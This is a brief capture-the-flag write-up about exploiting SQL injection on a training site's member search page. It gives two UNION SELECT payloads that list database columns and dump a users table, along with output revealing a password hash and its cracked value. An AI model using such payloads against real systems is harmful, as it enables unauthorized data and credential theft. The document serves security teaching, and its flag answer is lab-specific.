# How I found it

There is Injection sql In Search Members page so i use this query to get all tables

`1 UNION SELECT table_name, column_name FROM information_schema.columns`

i found a table call 'users' i get all informations in this table and i found the flag in the id : 5 by

`1 UNION SELECT Commentaire, countersign FROM users`

### Result
````
ID: 1 UNION SELECT Commentaire, countersign FROM users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28 ==> FortyTwo
````
